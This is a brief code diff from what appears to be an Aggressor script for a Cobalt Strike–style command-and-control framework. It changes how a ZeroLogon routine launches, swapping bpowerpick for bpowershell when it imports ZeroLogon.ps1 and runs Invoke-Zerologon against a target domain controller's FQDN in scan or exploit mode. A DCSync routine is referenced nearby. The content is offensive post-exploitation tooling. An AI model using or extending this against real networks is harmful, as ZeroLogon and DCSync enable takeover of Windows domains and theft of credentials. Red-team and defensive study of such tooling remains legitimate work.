@@ -10,9 +10,9 @@ sub DCSync{
 sub ZeroLogon{
 	bpowershell_import($bid, script_resource("bin/ZeroLogon.ps1"));
 	if($3["Scan"] eq 'true'){
-		bpowerpick($bid,"Invoke-Zerologon $3['fqdn'] 0");
+		bpowershell($bid,"Invoke-Zerologon $3['fqdn'] 0");
 	} else {
-		bpowerpick($bid,"Invoke-Zerologon $3['fqdn'] 1");
+		bpowershell($bid,"Invoke-Zerologon $3['fqdn'] 1");
 	}
 	
 }
